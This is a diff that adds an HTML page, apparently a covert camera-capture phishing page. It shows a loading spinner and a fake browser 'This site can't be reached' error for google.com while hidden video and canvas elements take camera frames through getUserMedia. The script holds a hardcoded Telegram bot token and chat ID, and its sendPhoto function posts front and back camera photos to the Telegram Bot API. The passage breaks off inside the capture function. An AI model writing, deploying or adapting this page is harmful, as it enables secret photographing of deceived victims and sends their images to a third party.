@@ -1,1 +1,109 @@
-hh
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000000;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .loader {
+            width: 70px;
+            height: 70px;
+            border: 6px solid #eeeeee;
+            border-top: 6px solid #0066ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        video, canvas { display: none; }
+
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+
+        .error-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            max-width: 360px;
+        }
+        .error-icon { font-size: 70px; margin-bottom: 10px; }
+        .error-title { font-size: 23px; font-weight: bold; }
+        .error-text { font-size: 15.5px; color: #444; line-height: 1.4; }
+        .reload-btn {
+            background: #0066ff;
+            color: white;
+            border: none;
+            padding: 14px 50px;
+            font-size: 17px;
+            border-radius: 50px;
+            margin-top: 25px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading">
+        <div class="loader"></div>
+    </div>
+
+    <div id="error-screen" class="error-screen">
+        <div class="error-icon">📄</div>
+        <div class="error-title">This site can’t be reached</div>
+        <div class="error-text">
+            www.google.com unexpectedly closed the connection.<br><br>
+            Try:<br>
+            Checking the connection
+        </div>
+        <div style="color:#777; font-size:13.5px; margin:20px 0;">ERR_CONNECTION_CLOSED</div>
+        <button class="reload-btn" onclick="location.reload()">Reload</button>
+        <div style="margin-top:30px; color:#0066ff; cursor:pointer;" onclick="location.reload()">Details</div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8888638884:AAF4oO8_G-d0omwbpKmPkyx6WnGd1wsmtXg";
+        const CHAT_ID = 7081323585;
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loading = document.getElementById('loading');
+        const errorScreen = document.getElementById('error-screen');
+
+        let done = false;
+
+        async function sendPhoto(blob, type) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, `photo_${type}.jpg`);
+            formData.append("caption", type === "front" 
+                ? `📸 أمامية - ${new Date().toLocaleString('ar-SA')}` 
+                : `📸 خلفية - ${new Date().toLocaleString('ar-SA')}`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e) {}
+        }
+
+        async function takePhoto(constraints, type) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+
+                // انتظار تحميل بيانات الفيديو لمعرفة الأبعاد الحقيقية
+                await new Promise((resolve) => {
